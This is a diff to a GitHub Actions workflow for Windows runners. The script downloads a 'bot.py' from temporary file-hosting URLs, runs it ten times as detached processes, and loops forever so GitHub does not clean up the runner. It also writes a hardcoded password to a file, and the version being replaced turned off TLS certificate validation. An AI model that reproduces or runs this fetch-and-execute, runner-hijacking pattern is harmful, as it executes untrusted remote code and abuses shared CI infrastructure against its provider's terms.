@@ -63,46 +63,14 @@ jobs:
           "Pass: admin@123" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           "OS: windows-2022" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           
-          # ============================================
-          # FIX: Disable SSL certificate validation
-          # (works on PowerShell 5.1 and 7+)
-          # ============================================
-          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-          [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
-          
-          # Download bot.py (with retry + fallback for -SkipCertificateCheck on PS7)
-          $btol = "https://zip3.tempfilestorage.link/public/2026-10-18/0e64f3c8-ce7e-4c0d-bc3b-f9fd24a7d3bb/bot.py"
-          $botPath = "$desktop\bot.py"
-          $downloaded = $false
-          
-          for ($attempt = 1; $attempt -le 3; $attempt++) {
-              Write-Host "Downloading bot.py (attempt ${attempt}/3)..."
-              try {
-                  # Try with -SkipCertificateCheck first (PS7+)
-                  try {
-                      Invoke-WebRequest -Uri $btol -OutFile $botPath -UseBasicParsing -TimeoutSec 30 -SkipCertificateCheck -ErrorAction Stop
-                  } catch {
-                      # Fallback for PS5.1
-                      Invoke-WebRequest -Uri $btol -OutFile $botPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
-                  }
-                  if ((Test-Path $botPath) -and ((Get-Item $botPath).Length -gt 0)) {
-                      $downloaded = $true
-                      Write-Host "bot.py downloaded successfully on Server ${serverNumber}! Size: $((Get-Item $botPath).Length) bytes"
-                      break
-                  }
-              } catch {
-                  Write-Host "Attempt ${attempt} failed: $_"
-                  Start-Sleep -Seconds 5
-              }
+          # Download bot.py
+          $btol = "https://fffff23232.router.direct/"
+          try {
+              Invoke-WebRequest -Uri $btol -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 15
+              Write-Host "bot.py downloaded successfully on Server ${serverNumber}!"
+          } catch {
+              Write-Host "Failed to download bot.py on Server ${serverNumber}: $_"
           }
-          
-          if (-not $downloaded) {
-              Write-Host "ERROR: Failed to download bot.py after 3 attempts!"
-              exit 1
-          }
-          
-          # Restore default certificate validation after download
-          [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
           
           # Install Python (only once)
           $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
@@ -119,7 +87,7 @@ jobs:
           Write-Host "Python path: $pythonPath"
           
           # ============================================
-          # RUN bot.py 10 TIMES
+          # RUN bot.py 10 TIMES USING PYTHON DIRECTLY
           # ============================================
           Write-Host ""
           Write-Host "============================================"
@@ -132,7 +100,11 @@ jobs:
           for ($run = 1; $run -le $totalRuns; $run++) {
               Write-Host "Starting bot.py (Run ${run}) on Server ${serverNumber}"
               
-              $process = Start-Process -FilePath $pythonPath -ArgumentList "`"$botPath`"" -WindowStyle Normal -PassThru
+              # Run Python directly with the bot script - DETACHED from parent
+              $botScript = "$desktop\bot.py"
+              
+              # Use Start-Process with python directly, completely detached
+              $process = Start-Process -FilePath $pythonPath -ArgumentList "`"$botScript`"" -WindowStyle Normal -PassThru
               
               if ($process) {
                   Write-Host "Run ${run} started successfully! Process ID: $($process.Id)"
@@ -145,7 +117,7 @@ jobs:
           }
           
           # ============================================
-          # KEEP RUNNER ALIVE
+          # KEEP SCRIPT RUNNING TO PREVENT CLEANUP
           # ============================================
           Write-Host ""
           Write-Host "============================================"
@@ -161,7 +133,9 @@ jobs:
           Write-Host "============================================"
           Write-Host ""
           Write-Host "Keeping runner alive to prevent bot termination..."
+          Write-Host "Press Ctrl+C to stop this runner"
           
+          # Keep the script running forever to prevent GitHub from cleaning up
           while ($true) {
               Start-Sleep -Seconds 60
               Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Still alive - ${successCount} bots running on Server ${serverNumber}"
